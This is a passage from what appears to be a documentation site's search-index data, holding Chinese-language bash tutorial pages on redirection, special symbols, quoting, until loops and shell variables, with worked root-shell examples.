/tmp/shui > haha.txt //\u6b63\u786e\u7684\u653e\u5230haha.txt ls: cannot access /tmp/shui: No such file or directory [root@shell ~]# ls /tmp/douniwan /tmp/shui > haha.txt 2> cry.txt //\u6b63\u786e\u7684\u653e\u5230haha.txt\uff0c\u9519\u8bef\u7684\u653e\u5230cry.txt\u4e2d [root@shell ~]# cat haha.txt /tmp/douniwan [root@shell ~]# cat cry.txt ls: cannot access /tmp/shui: No such file or directory [root@shell ~]# ls /tmp/douniwan /tmp/shui > haha.txt 2>&1 //\u6b63\u786e\u7684\u653e\u5728haha.txt\uff0c\u9519\u8bef\u7684\u4e5f\u653e\u5728\u8fd9\u91cc\u9762 [root@shell ~]# cat haha.txt ls: cannot access /tmp/shui: No such file or directory /tmp/douniwan 2>&1\uff1a\u9519\u8bef\u7684\u6309\u7167\u6b63\u786e\u7684\u8f93\u51fa &> \uff1a\u4e0d\u8bba\u5bf9\u9519\u90fd\u91cd\u5b9a\u5411\uff0c\u4e00\u822c\u5728\u811a\u672c\u4e2d\uff0c\u5199\u6cd5 &>/dev/null [root@shell ~]# ls /tmp/douniwan /tmp/shui &> haha.txt [root@shell ~]# cat haha.txt ls: cannot access /tmp/shui: No such file or directory /tmp/douniwan \u91cd\u5b9a\u5411\u53ef\u4ee5\u5b9a\u5411\u5230\u6587\u4ef6\u6216\u8005\u8bbe\u5907\u3002 \u91cd\u5b9a\u5411\u5230\u8bbe\u5907\uff1a \u7b2c\u4e00\u4e2a\u6807\u7b7e\uff1a\u67e5\u770b\u5f53\u524d\u7ec8\u7aef\u7684\u8bbe\u5907\u540d [root@shell ~]# tty /dev/pts/1 \u7b2c\u4e8c\u4e2a\u6807\u7b7e\uff1a [root@shell ~]# echo hello pts1 > /dev/pts/1 \u7b2c\u4e00\u4e2a\u6807\u7b7e\uff1a\u4f1a\u770b\u5230hello pts1 [root@shell ~]# hello pts1 \u5411\u6240\u6709\u767b\u5f55\u5230\u7cfb\u7edf\u7684\u7ec8\u7aef\u53d1\u6d88\u606f\uff1a [root@shell ~]# wall \"go out\" --- write all \u90fd\u7529\u5230\u7a7a\u91cc\u7684\u4e24\u79cd\u6a21\u5f0f \u547d\u4ee4 \u6807\u51c6\u8f93\u51fa \u9519\u8bef\u8f93\u51fa >/dev/null 2>&1 \u4e22\u5f03 \u4e22\u5f03 2>&1 >/dev/null \u4e22\u5f03 \u5c4f\u5e55 \u5176\u4ed6 Tee","title":"\u91cd\u5b9a\u5411"},{"location":"programming_language/bash/special_symbols/","text":"\u7279\u6b8a\u5b57\u7b26 \\ \u2014\u2014 \u8868\u793a\u8f6c\u4e49 [root@shell ~]# echo $PATH /usr/lib64/qt-3.3/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/root/bin [root@shell ~]# echo \\$PATH //\u6253\u5370\u666e\u901a\u7684$\u5b57\u7b26 $PATH & \u2014\u2014 \u540e\u53f0\u8fd0\u884c [root@shell ~]# sleep 100 & ; \u2014\u2014 \u7528\u6765\u5206\u9694\u591a\u6761\u547d\u4ee4(\u591a\u6761\u547d\u4ee4\u4e4b\u95f4\u53ef\u4ee5\u6ca1\u6709\u5173\u7cfb\uff0c\u5373\u5404\u4e2a\u547d\u4ee4\u7684\u7ed3\u679c\u4e92\u4e0d\u5f71\u54cd) [root@shell ~]# cd /tmp;touch douniwan [root@shell tmp]# ls douniwan douniwan [root@shell tmp]# cd /douniwan;touch suibian bash: cd: /douniwan: No such file or directory [root@shell tmp]# ls suibian suibian && \u2014\u2014 \u8fde\u63a5\u4e24\u6761\u547d\u4ee4\uff0c\u524d\u9762\u7684\u547d\u4ee4\u6267\u884c\u6210\u529f\uff0c\u624d\u6267\u884c\u540e\u9762\u7684\u547d\u4ee4(\u5e76\u4e14) [root@shell tmp]# ls douniwan && pwd douniwan /tmp [root@shell tmp]# ls doushuiwan && pwd ls: cannot access doushuiwan: No such file or directory [root@shell tmp]# make && make install //\u540e\u9762\u4f1a\u7528\u5230\u7684\uff0c\u53ea\u6709make\u6210\u529f\u4e86\uff0c\u624d\u6267\u884cmake install || \u2014\u2014 \u8fde\u63a5\u4e24\u6761\u547d\u4ee4\uff0c\u524d\u9762\u7684\u547d\u4ee4\u6267\u884c\u5931\u8d25\uff0c\u624d\u4f1a\u6267\u884c\u540e\u9762\u7684\u547d\u4ee4(\u6216\u8005) [root@shell tmp]# ls douniwan || pwd douniwan [root@shell tmp]# ls doushuiwan || pwd ls: cannot access doushuiwan: No such file or directory /tmp (cmds) \u2014\u2014 \u5f00\u542f\u5b50shell \u5728shell\u73af\u5883\u4e2d\u518d\u5f00\u542f\u4e00\u4e2ashell\uff0c\u65b0\u5f00\u542f\u7684shell\u88ab\u79f0\u4e3a\u5b50shell\uff0c\u539f\u6765\u7684shell\u88ab\u79f0\u4e3a\u7236shell\u3002 [root@shell script]# cd /tmp ; touch shadouxing //\u5728\u5f53\u524dshell\u4e2d\u6267\u884c\u7684\uff0c\u4f1a\u5f71\u54cd\u5f53\u524d\u7684shell [root@shell tmp]# pwd /tmp [root@shell tmp]# (cd /root ; touch shenmexing) //\u5728\u5f53\u524dshell\u5f00\u542f\u5b50shell\u53bb\u6267\u884c\uff0c\u547d\u4ee4\u6267\u884c\u7ed3\u675f\uff0c\u5b50shell\u7ec8\u6b62\uff0c\u4e0d\u4f1a\u5f71\u54cd\u7236shell\u7684\u8fd0\u884c\u7684\u3002 [root@shell tmp]# pwd //\u7236shell\u7684\u8def\u5f84\u5e76\u672a\u53d1\u751f\u6539\u53d8 /tmp [root@shell tmp]# ls /root/shenmexing /root/shenmexing \u5b50shell\u80fd\u591f\u7ee7\u627f\u7236shell\u4e2d\u7684\u73af\u5883\u53d8\u91cf {cmds} \u2014\u2014 \u4e0d\u5f00\u542f\u5b50shell\uff0c\u76f4\u63a5\u5728\u5f53\u524dshell\u4e2d\u8fd0\u884c \u5f15\u7528\uff1a\u5373\u5c4f\u853d\u7279\u6b8a\u7b26\u53f7\u7684\u542b\u4e49 ' ' \u2014\u2014 \u5355\u5f15\u53f7\uff0c\u5b8c\u5168\u5f15\u7528\uff0c\u4e5f\u53eb\u5f3a\u5f15\u7528\u3002\u80fd\u591f\u5c4f\u853d\u9664\u4e86\u81ea\u5df1\u4ee5\u5916\u7684\u6240\u6709\u7684\u7279\u6b8a\u5b57\u7b26 \" \" \u2014\u2014 \u53cc\u5f15\u53f7\uff0c\u975e\u5b8c\u5168\u5f15\u7528\uff0c\u4e5f\u53eb\u5f31\u5f15\u7528\u3002\u80fd\u591f\u5c4f\u853d\u5927\u90e8\u5206\u7684\u7279\u6b8a\u5b57\u7b26\uff0c\u5c4f\u853d\u4e0d\u4e86$\u548c` [root@shell tmp]# echo '$PATH' $PATH [root@shell tmp]# echo \"$PATH\" /usr/lib64/qt-3.3/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/root/bin \u547d\u4ee4\u7684\u5f15\u7528(\u4e5f\u53eb\u547d\u4ee4\u7684\u66ff\u6362) `` \u2014\u2014 \u53cd\u5f15\u53f7 \u4f7f\u7528\u7684\u662f\u547d\u4ee4\u7684\u6267\u884c\u7ed3\u679c $() \u2014\u2014 \u4e5f\u662f\u547d\u4ee4\u7684\u5f15\u7528 \u6ce8\u610f\uff1a\u9ed8\u8ba4\u7684\u60c5\u51b5\u4e0b\uff0c\u53cd\u5f15\u53f7\u662f\u4e0d\u652f\u6301\u5d4c\u5957\u7684\u3002 [root@shell tmp]# rpm -qf `which ` -enhanced-7.2.411-1.8.el6.x86_64 [root@shell tmp]# rpm -qf $(which ) -enhanced-7.2.411-1.8.el6.x86_64 \u5d4c\u5957\uff1a [root@shell tmp]# dir_name=`basename `pwd`` //\u5d4c\u5957\u4f1a\u62a5\u9519 basename: missing operand Try `basename --help' for more information. [root@shell tmp]# dir_name=$(basename $(pwd)) //\u652f\u6301\u5d4c\u5957 [root@shell tmp]# echo $dir_name tmp","title":"\u7279\u6b8a\u7b26\u53f7"},{"location":"programming_language/bash/special_symbols/#_1","text":"\\ \u2014\u2014 \u8868\u793a\u8f6c\u4e49 [root@shell ~]# echo $PATH /usr/lib64/qt-3.3/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/root/bin [root@shell ~]# echo \\$PATH //\u6253\u5370\u666e\u901a\u7684$\u5b57\u7b26 $PATH & \u2014\u2014 \u540e\u53f0\u8fd0\u884c [root@shell ~]# sleep 100 & ; \u2014\u2014 \u7528\u6765\u5206\u9694\u591a\u6761\u547d\u4ee4(\u591a\u6761\u547d\u4ee4\u4e4b\u95f4\u53ef\u4ee5\u6ca1\u6709\u5173\u7cfb\uff0c\u5373\u5404\u4e2a\u547d\u4ee4\u7684\u7ed3\u679c\u4e92\u4e0d\u5f71\u54cd) [root@shell ~]# cd /tmp;touch douniwan [root@shell tmp]# ls douniwan douniwan [root@shell tmp]# cd /douniwan;touch suibian bash: cd: /douniwan: No such file or directory [root@shell tmp]# ls suibian suibian && \u2014\u2014 \u8fde\u63a5\u4e24\u6761\u547d\u4ee4\uff0c\u524d\u9762\u7684\u547d\u4ee4\u6267\u884c\u6210\u529f\uff0c\u624d\u6267\u884c\u540e\u9762\u7684\u547d\u4ee4(\u5e76\u4e14) [root@shell tmp]# ls douniwan && pwd douniwan /tmp [root@shell tmp]# ls doushuiwan && pwd ls: cannot access doushuiwan: No such file or directory [root@shell tmp]# make && make install //\u540e\u9762\u4f1a\u7528\u5230\u7684\uff0c\u53ea\u6709make\u6210\u529f\u4e86\uff0c\u624d\u6267\u884cmake install || \u2014\u2014 \u8fde\u63a5\u4e24\u6761\u547d\u4ee4\uff0c\u524d\u9762\u7684\u547d\u4ee4\u6267\u884c\u5931\u8d25\uff0c\u624d\u4f1a\u6267\u884c\u540e\u9762\u7684\u547d\u4ee4(\u6216\u8005) [root@shell tmp]# ls douniwan || pwd douniwan [root@shell tmp]# ls doushuiwan || pwd ls: cannot access doushuiwan: No such file or directory /tmp (cmds) \u2014\u2014 \u5f00\u542f\u5b50shell \u5728shell\u73af\u5883\u4e2d\u518d\u5f00\u542f\u4e00\u4e2ashell\uff0c\u65b0\u5f00\u542f\u7684shell\u88ab\u79f0\u4e3a\u5b50shell\uff0c\u539f\u6765\u7684shell\u88ab\u79f0\u4e3a\u7236shell\u3002 [root@shell script]# cd /tmp ; touch shadouxing //\u5728\u5f53\u524dshell\u4e2d\u6267\u884c\u7684\uff0c\u4f1a\u5f71\u54cd\u5f53\u524d\u7684shell [root@shell tmp]# pwd /tmp [root@shell tmp]# (cd /root ; touch shenmexing) //\u5728\u5f53\u524dshell\u5f00\u542f\u5b50shell\u53bb\u6267\u884c\uff0c\u547d\u4ee4\u6267\u884c\u7ed3\u675f\uff0c\u5b50shell\u7ec8\u6b62\uff0c\u4e0d\u4f1a\u5f71\u54cd\u7236shell\u7684\u8fd0\u884c\u7684\u3002 [root@shell tmp]# pwd //\u7236shell\u7684\u8def\u5f84\u5e76\u672a\u53d1\u751f\u6539\u53d8 /tmp [root@shell tmp]# ls /root/shenmexing /root/shenmexing \u5b50shell\u80fd\u591f\u7ee7\u627f\u7236shell\u4e2d\u7684\u73af\u5883\u53d8\u91cf {cmds} \u2014\u2014 \u4e0d\u5f00\u542f\u5b50shell\uff0c\u76f4\u63a5\u5728\u5f53\u524dshell\u4e2d\u8fd0\u884c \u5f15\u7528\uff1a\u5373\u5c4f\u853d\u7279\u6b8a\u7b26\u53f7\u7684\u542b\u4e49 ' ' \u2014\u2014 \u5355\u5f15\u53f7\uff0c\u5b8c\u5168\u5f15\u7528\uff0c\u4e5f\u53eb\u5f3a\u5f15\u7528\u3002\u80fd\u591f\u5c4f\u853d\u9664\u4e86\u81ea\u5df1\u4ee5\u5916\u7684\u6240\u6709\u7684\u7279\u6b8a\u5b57\u7b26 \" \" \u2014\u2014 \u53cc\u5f15\u53f7\uff0c\u975e\u5b8c\u5168\u5f15\u7528\uff0c\u4e5f\u53eb\u5f31\u5f15\u7528\u3002\u80fd\u591f\u5c4f\u853d\u5927\u90e8\u5206\u7684\u7279\u6b8a\u5b57\u7b26\uff0c\u5c4f\u853d\u4e0d\u4e86$\u548c` [root@shell tmp]# echo '$PATH' $PATH [root@shell tmp]# echo \"$PATH\" /usr/lib64/qt-3.3/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/root/bin \u547d\u4ee4\u7684\u5f15\u7528(\u4e5f\u53eb\u547d\u4ee4\u7684\u66ff\u6362) `` \u2014\u2014 \u53cd\u5f15\u53f7 \u4f7f\u7528\u7684\u662f\u547d\u4ee4\u7684\u6267\u884c\u7ed3\u679c $() \u2014\u2014 \u4e5f\u662f\u547d\u4ee4\u7684\u5f15\u7528 \u6ce8\u610f\uff1a\u9ed8\u8ba4\u7684\u60c5\u51b5\u4e0b\uff0c\u53cd\u5f15\u53f7\u662f\u4e0d\u652f\u6301\u5d4c\u5957\u7684\u3002 [root@shell tmp]# rpm -qf `which ` -enhanced-7.2.411-1.8.el6.x86_64 [root@shell tmp]# rpm -qf $(which ) -enhanced-7.2.411-1.8.el6.x86_64 \u5d4c\u5957\uff1a [root@shell tmp]# dir_name=`basename `pwd`` //\u5d4c\u5957\u4f1a\u62a5\u9519 basename: missing operand Try `basename --help' for more information. [root@shell tmp]# dir_name=$(basename $(pwd)) //\u652f\u6301\u5d4c\u5957 [root@shell tmp]# echo $dir_name tmp","title":"\u7279\u6b8a\u5b57\u7b26"},{"location":"programming_language/bash/until/","text":"Until \u8bed\u6cd5\u683c\u5f0f \u53d8\u91cf\u7684\u521d\u59cb\u503c until \u6761\u4ef6\u8868\u8fbe\u5f0f\u6216\u8005\u547d\u4ee4 do \u5faa\u73af\u4f53 \u53d8\u91cf\u7684\u66f4\u65b0 done \u8bf4\u660e\uff1a\u5f53\u6761\u4ef6\u4e3a\u771f\uff0c\u9000\u51fa\u5faa\u73af until\u4e0ewhile\u662f\u76f8\u53cd\u7684 [root@shell script]# cat until.sh #!/bin/bash i=1 until [ $i -gt 5 ] do echo $i let i++ done","title":"until\u5faa\u73af"},{"location":"programming_language/bash/until/#until","text":"\u8bed\u6cd5\u683c\u5f0f \u53d8\u91cf\u7684\u521d\u59cb\u503c until \u6761\u4ef6\u8868\u8fbe\u5f0f\u6216\u8005\u547d\u4ee4 do \u5faa\u73af\u4f53 \u53d8\u91cf\u7684\u66f4\u65b0 done \u8bf4\u660e\uff1a\u5f53\u6761\u4ef6\u4e3a\u771f\uff0c\u9000\u51fa\u5faa\u73af until\u4e0ewhile\u662f\u76f8\u53cd\u7684 [root@shell script]# cat until.sh #!/bin/bash i=1 until [ $i -gt 5 ] do echo $i let i++ done","title":"Until"},{"location":"programming_language/bash/var/","text":"Bash\u53d8\u91cf \u7528\u6765\u5b58\u50a8\u4fe1\u606f\u7684\uff0c\u5176\u5b9e\u662f\u5185\u5b58\u4e2d\u7684\u7a7a\u95f4\uff0c\u4e00\u4e2a\u53d8\u91cf\u4fdd\u5b58\u4e00\u4e2a\u503c \u53d8\u91cf\u7684\u547d\u540d\u89c4\u5219 \u53d8\u91cf\u7684\u540d\u5b57\u4e00\u5b9a\u662f\u7531\u5b57\u6bcd\u3001\u6570\u5b57\u548c\u4e0b\u5212\u7ebf\u7ec4\u6210\uff0c\u4e0d\u80fd\u4ee5\u6570\u5b57\u5f00\u5934\uff0c\u53d8\u91cf\u540d\u4e0d\u80fd\u4f7f\u7528\u5173\u952e\u5b57 \u5408\u6cd5\u7684\uff1aa2 PRONAME _name a_3 \u975e\u6cd5\u7684\uff1a2a a@b \u5f15\u7528\u53d8\u91cf\uff1a$a2 [root@node0 ~]# env --\u67e5\u770b\u6240\u6709\u7684\u73af\u5883\u53d8\u91cf [root@node0 ~]# set --\u67e5\u770b\u6240\u6709\u7684\u53d8\u91cf shell\u4e2d\u53d8\u91cf\u7684\u7c7b\u578b \u672c\u5730\u53d8\u91cf(\u5c40\u90e8\u53d8\u91cf) \u73af\u5883\u53d8\u91cf(\u5168\u5c40\u53d8\u91cf) \u4f4d\u7f6e\u53d8\u91cf \u7279\u6b8a\u53d8\u91cf \u200b \u672c\u5730\u53d8\u91cf \u2014\u2014 \u5c40\u90e8\u53d8\u91cf \u4e5f\u53eb\u81ea\u5b9a\u4e49\u53d8\u91cf\uff0c\u7528\u6237\u6839\u636e\u81ea\u5df1\u7684\u9700\u6c42\u81ea\u5df1\u5b9a\u4e49\u7684\u53d8\u91cf \u4f5c\u7528\u57df(\u4f5c\u7528\u8303\u56f4)\uff1a\u5728\u6574\u4e2ashell\u811a\u672c\u4e2d\u751f\u6548\uff1b\u5982\u679c\u662f\u5728\u547d\u4ee4\u884c\u5b9a\u4e49\u7684\u53d8\u91cf\uff0c\u4f5c\u7528\u8303\u56f4\u5c31\u662f\u5f53\u524dshell\u3002 \u5b9a\u4e49\u53d8\u91cf\uff1a \u53d8\u91cf\u540d=\u53d8\u91cf\u503c //\u6ce8\u610f\uff1a\u7b49\u53f7\u4e24\u8fb9\u4e00\u5b9a\u4e0d\u80fd\u6709\u7a7a\u683c [root@shell tmp]# name=mary [root@shell tmp]# echo $name mary [root@shell tmp]# echo $SHLVL //\u67e5\u770b\u5f53\u524d\u5728\u7b2c\u51e0\u7ea7shell 2 [root@shell tmp]# bash //\u5f00\u542f\u4e00\u4e2a\u5b50shell [root@shell tmp]# echo $SHLVL //\u67e5\u770b\u5f53\u524d\u5728\u7b2c\u51e0\u7ea7shell 3 [root@shell tmp]# echo $name //\u5728\u5b50shell\u4e2d\u662f\u770b\u4e0d\u5230\u7236shell\u4e2d\u7684\u672c\u5730\u53d8\u91cf [root@shell tmp]# exit exit [root@shell tmp]# echo $SHLVL 2 \u73af\u5883\u53d8\u91cf \u2014\u2014 \u5168\u5c40\u53d8\u91cf \u4f5c\u7528\u8303\u56f4\uff1a\u5f53\u524dshell\u53ca\u5176\u5b50shell \u5b9a\u4e49\u73af\u5883\u53d8\u91cf\uff1a 1\uff09\u5c06\u5df2\u7ecf\u5b9a\u4e49\u7684\u672c\u5730\u53d8\u91cf\u5bfc\u51fa\u6210\u73af\u5883\u53d8\u91cf export [root@shell tmp]# export name [root@shell tmp]# echo $name mary [root@shell tmp]# bash [root@shell tmp]# echo $name //\u5728\u5b50shell\u4e2d\u53ef\u4ee5\u770b\u5230name\u7684\u503c\u4e86 mary 2\uff09\u5728\u5b9a\u4e49\u53d8\u91cf\u65f6\uff0c\u76f4\u63a5\u5c06\u5176\u5b9a\u4e49\u4e3a\u73af\u5883\u53d8\u91cf [root@shell tmp]# echo $SHLVL 2 [root@shell tmp]# export age=88 [root@shell tmp]# bash [root@shell tmp]# echo $age 88 \u6ce8\u610f\uff1a\u5728\u5b50shell\u4e2d\u4fee\u6539\u53d8\u91cf\u7684\u503c\uff0c\u4e0d\u5f71\u54cd\u7236shell\u4e2d\u7684\u53d8\u91cf\u7684\u503c\u3002 [root@shell tmp]# echo $SHLVL 3 [root@shell tmp]# age=66 [root@shell tmp]# echo $age 66 [root@shell tmp]# exit exit [root@shell tmp]# echo $age 88 \u7236\u53d8\u5b50\u4e5f\u53d8\uff0c\u5b50\u53d8\u7236\u4e0d\u53d8\u3002 \u5982\u679c\u60f3\u8ba9\u73af\u5883\u53d8\u91cf\u6c38\u4e45\u751f\u6548\uff0c\u90a3\u4e48\u5c31\u5199\u5728\u73af\u5883\u53d8\u91cf\u914d\u7f6e\u6587\u4ef6\u4e2d\u5373\u53ef\u3002 \u53d6\u6d88\u53d8\u91cf\u7684\u503c [root@shell tmp]# unset name [root@shell tmp]# echo $name \u4f4d\u7f6e\u53d8\u91cf $0 \u2014\u2014 \u8868\u793a\u5f53\u524d\u8fd0\u884c\u7684\u811a\u672c\u6216\u8005\u547d\u4ee4\u672c\u8eab $1 ~ ${10} \u2014\u2014 \u8868\u793a\u811a\u672c\u7684\u4f4d\u7f6e\u53c2\u6570\uff0c$1\u8868\u793a\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u4f9d\u6b64\u7c7b\u63a8 $# \u2014\u2014 \u8868\u793a\u53c2\u6570\u7684\u4e2a\u6570 $ \u8fd9\u4e2a\u53d8\u91cf\u4ee3\u8868\u547d\u4ee4\u884c\u4e2d\u6240\u6709\u7684\u53c2\u6570\uff0c $ \u628a\u6240\u6709\u7684\u53c2\u6570\u770b\u6210\u4e00\u4e2a\u6574\u4f53 $@ \u8fd9\u4e2a\u53d8\u91cf\u4e5f\u4ee3\u8868\u547d\u4ee4\u884c\u4e2d\u6240\u6709\u7684\u53c2\u6570\uff0c \u4e0d\u8fc7$@\u628a\u6bcf\u4e2a\u53c2\u6570\u533a\u5206\u5bf9\u5f85 $@\u548c$* \u2014\u2014 \u8868\u793a\u53c2\u6570\u7684\u5217\u8868 [root@shell tmp]# ls /root /tmp ls \u2014\u2014 $0 /root \u2014\u2014 $1 /tmp \u2014\u2014 $2 [root@shell tmp]# cd /script/ [root@shell script]# cat position.sh #!/bin/bash echo '$0='$0 echo '$1='$1 echo '$2='$2 echo '$3='$3 echo '$4='$4 echo '$5='$5 echo '$6='$6 echo '$7='$7 echo '$8='$8 echo '$9='$9 echo '$10='$10 echo '$11='${11} echo '$#='$# echo '$*='$* echo '$@='$@ [root@shell script]# chmod +x position.sh [root@shell script]# ./position.sh a b c d e f g h i j k l m $0=./position.sh $1=a $2=b $3=c $4=d $5=e $6=f $7=g $8=h $9=i $10=a0 $11=k $#=13 // \u53c2\u6570\u7684\u4e2a\u6570 $*=a b c d e f g h i j k l m //\u6253\u5370\u53c2\u6570\u5217\u8868 $@=a b c d e f g h i j k l m $*\u548c$@\u662fShell\u7684\u7279\u6b8a\u53d8\u91cf\uff0c\u4f5c\u7528\u90fd\u662f\u83b7\u53d6\u4f20\u9012\u7ed9\u811a\u672c\u6216\u51fd\u6570\u7684\u6240\u6709\u53c2\u6570\u3002\u5728\u6ca1\u6709\u88ab\u53cc\u5f15\u53f7\u5305\u56f4\u65f6\uff0c\u4e24\u8005\u6ca1\u6709\u533a\u522b\uff0c\u90fd\u662f\u5c06\u63a5\u53d7\u5230\u7684\u6bcf\u4e2a\u53c2\u6570\u90fd\u662f\u72ec\u7acb\u7684\uff0c\u7528\u7a7a\u683c\u5206\u9694\u3002\u4e5f\u5c31\u662f\u8bf4\u4e0b\u9762\u4e24\u6bb5\u4ee3\u7801\u662f\u7b49\u6548\u7684\u3002 [root@localhost code]# cat test for var in $@ do echo ${var} done [root@localhost code]# [root@localhost code]# ./test a b c d e a b c d e [root@localhost code]# [root@localhost code]# chmod a+x test1 [root@localhost code]# cat test1 for var in $* do echo ${var} done [root@localhost code]# ./test1 a b c d a b c d \u5f53\u88ab\u53cc\u5f15\u53f7\u5305\u56f4\u65f6\uff0c$@\u4e0e\u6ca1\u6709\u88ab\u53cc\u5f15\u53f7\u5305\u56f4\u65f6\u6ca1\u6709\u53d8\u5316\uff0c\u6bcf\u4e2a\u53c2\u6570\u4f9d\u7136\u662f\u72ec\u7acb\u7684\u3002\u4f46\u662f$*\u88ab\u53cc\u5f15\u53f7\u5305\u56f4\u65f6\uff0c\u4f1a\u5c06\u6240\u6709\u53c2\u6570\u770b\u4f5c\u4e00\u4e2a\u6574\u4f53\u3002\u4e0b\u9762\u4e24\u6bb5\u4ee3\u7801\u7684\u7ed3\u679c\u662f\u4e0d\u540c\u7684\u3002 [root@localhost code]# cat test for var in \"$@\" do echo ${var} done [root@localhost code]# ./test a b c d a b c d [root@localhost code]# [root@localhost code]# cat test1 for var in \"$*\" do echo ${var} done [root@localhost code]# [root@localhost code]# ./test1 a b c d a b c d [root@localhost code]# \u7279\u6b8a\u53d8\u91cf $$ \u2014\u2014 \u67e5\u770b\u5f53\u524dshell\u7684pid [root@shell script]# echo $$ 8015 !$\u548c$_ \u2014\u2014 \u4e0a\u4e00\u6761\u547d\u4ee4\u7684\u6700\u540e\u4e00\u4e2a\u53c2\u6570 [root@shell yum.repos.d]# cd /etc/yum.repos.d/ [root@shell yum.repos.d]# cat local.repo [root@shell yum.repos.d]# cat !$ \u6216\u8005 alt+.(\u70b9) \u4e5f\u53ef\u4ee5 $?\uff1a\u4e0a\u4e00\u6761\u547d\u4ee4\u7684\u6267\u884c\u72b6\u6001\u7684\u8fd4\u56de\u503c \u2014\u2014 \u5199\u811a\u672c\u65f6\u6709\u7528 \u6267\u884c\u72b6\u6001\u8fd4\u56de\u503c(0-255)\uff0c\u5206\u4e24\u7c7b 0\uff1a\u8868\u793a\u4e0a\u4e00\u6761\u547d\u4ee4\u6267\u884c\u6210\u529f \u975e0\uff1a\u8868\u793a\u4e0a\u4e00\u6761\u547d\u4ee4\u6267\u884c\u5931\u8d25 [root@shell ~]# ls /tmp/douniwan &>/dev/null [root@shell ~]# echo $? 0 [root@shell ~]# ls /tmp/nidoushui &>/dev/null [root@shell ~]# echo $? 2 \u53d8\u91cf\u7684\u5f15\u7528 1\u3001$\u53d8\u91cf\u540d echo $\u53d8\u91cf\u540d 2\u3001${\u53d8\u91cf\u540d} \u2014\u2014 \u4e3a\u4e86\u9632\u6b62\u6b67\u4e49 [root@shell ~]# fruit=banana [root@shell ~]# echo \"There are some $fruits.\" There are some . [root@shell ~]# echo \"There are some ${fruit}s.\" There are some bananas. local\u5173\u952e\u5b57 \u4f5c\u7528\uff1a\u4e00\u822c\u7528\u4e8eshell\u5185\u5c40\u90e8\u53d8\u91cf\u7684\u5b9a\u4e49\uff0c\u591a\u4f7f\u7528\u5728\u51fd\u6570\u5185\u90e8 \uff081\uff09shell\u811a\u672c\u4e2d\u5b9a\u4e49\u7684\u53d8\u91cf\u662fglobal\u7684\uff0c\u5176\u4f5c\u7528\u57df\u4ece\u88ab\u5b9a\u4e49\u7684\u5730\u65b9\u5f00\u59cb\uff0c\u5230shell\u7ed3\u675f\u6216\u88ab\u663e\u793a\u5220\u9664\u7684\u5730\u65b9\u4e3a\u6b62\u3002 \uff082\uff09shell\u51fd\u6570\u5b9a\u4e49\u7684\u53d8\u91cf\u9ed8\u8ba4\u662fglobal\u7684\uff0c\u5176\u4f5c\u7528\u57df\u4ece \u51fd\u6570\u88ab\u8c03\u7528\u65f6\u6267\u884c\u53d8\u91cf\u5b9a\u4e49\u7684\u5730\u65b9 \u5f00\u59cb\uff0c\u5230shell\u7ed3\u675f\u6216\u88ab\u663e\u793a\u5220\u9664\u5904\u4e3a\u6b62\u3002\u51fd\u6570\u5b9a\u4e49\u7684\u53d8\u91cf\u53ef\u4ee5\u88ab\u663e\u793a\u5b9a\u4e49\u6210local\u7684\uff0c\u5176\u4f5c\u7528\u57df\u5c40\u9650\u4e8e\u51fd\u6570\u5185\u3002\u4f46\u8bf7\u6ce8\u610f\uff0c\u51fd\u6570\u7684\u53c2\u6570\u662flocal\u7684\u3002 \uff083\uff09\u5982\u679c\u540c\u540d\uff0cShell\u51fd\u6570\u5b9a\u4e49\u7684local\u53d8\u91cf\u4f1a\u5c4f\u853d\u811a\u672c\u5b9a\u4e49\u7684global\u53d8\u91cf\u3002 #!/bin/bash function Hello() { local text=\"Hello World!!!\" #\u5c40\u90e8\u53d8\u91cf echo $text } Hello","title":"\u53d8\u91cf"},{"location":"programming_language/bash/var/#_1","text":"\u53d8\u91cf\u7684\u540d\u5b57\u4e00\u5b9a\u662f\u7531\u5b57\u6bcd\u3001\u6570\u5b57\u548c\u4e0b\u5212\u7ebf\u7ec4\u6210\uff0c\u4e0d\u80fd\u4ee5\u6570\u5b57\u5f00\u5934\uff0c\u53d8\u91cf\u540d\u4e0d\u80fd\u4f7f\u7528\u5173\u952e\u5b57 \u5408\u6cd5\u7684\uff1aa2 PRONAME _name a_3 \u975e\u6cd5\u7684\uff1a2a a@b \u5f15\u7528\u53d8\u91cf\uff1a$a2 [root@node0 ~]# env --\u67e5\u770b\u6240\u6709\u7684\u73af\u5883\u53d8\u91cf [root@node0 ~]# set --\u67e5\u770b\u6240\u6709\u7684\u53d8\u91cf","title":"\u53d8\u91cf\u7684\u547d\u540d\u89c4\u5219"},{"location":"programming_language/bash/var/#shell","text":"\u672c\u5730\u53d8\u91cf(\u5c40\u90e8\u53d8\u91cf) \u73af\u5883\u53d8\u91cf(\u5168\u5c40\u53d8\u91cf) \u4f4d\u7f6e\u53d8\u91cf \u7279\u6b8a\u53d8\u91cf \u200b","title":"shell\u4e2d\u53d8\u91cf\u7684\u7c7b\u578b"},{"location":"programming_language/bash/var/#_2","text":"\u4e5f\u53eb\u81ea\u5b9a\u4e49\u53d8\u91cf\uff0c\u7528\u6237\u6839\u636e\u81ea\u5df1\u7684\u9700\u6c42\u81ea\u5df1\u5b9a\u4e49\u7684\u53d8\u91cf \u4f5c\u7528\u57df(\u4f5c\u7528\u8303\u56f4)\uff1a\u5728\u6574\u4e2ashell\u811a\u672c\u4e2d\u751f\u6548\uff1b\u5982\u679c\u662f\u5728\u547d\u4ee4\u884c\u5b9a\u4e49\u7684\u53d8\u91cf\uff0c\u4f5c\u7528\u8303\u56f4\u5c31\u662f\u5f53\u524dshell\u3002 \u5b9a\u4e49\u53d8\u91cf\uff1a \u53d8\u91cf\u540d=\u53d8\u91cf\u503c //\u6ce8\u610f\uff1a\u7b49\u53f7\u4e24\u8fb9\u4e00\u5b9a\u4e0d\u80fd\u6709\u7a7a\u683c [root@shell tmp]# name=mary [root@shell tmp]# echo $name mary [root@shell tmp]# echo $SHLVL //\u67e5\u770b\u5f53\u524d\u5728\u7b2c\u51e0\u7ea7shell 2 [root@shell tmp]# bash //\u5f00\u542f\u4e00\u4e2a\u5b50shell [root@shell tmp]# echo $SHLVL //\u67e5\u770b\u5f53\u524d\u5728\u7b2c\u51e0\u7ea7shell 3 [root@shell tmp]# echo 